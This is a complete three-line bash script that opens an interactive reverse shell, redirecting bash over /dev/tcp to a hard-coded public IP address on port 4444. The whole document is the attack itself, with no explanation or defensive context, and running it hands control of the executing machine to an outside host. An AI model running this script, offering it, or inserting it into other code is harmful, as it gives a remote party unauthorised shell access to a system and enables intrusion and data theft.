#!/bin/bash
LHOST="107.174.242.20"
LPORT=4444

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
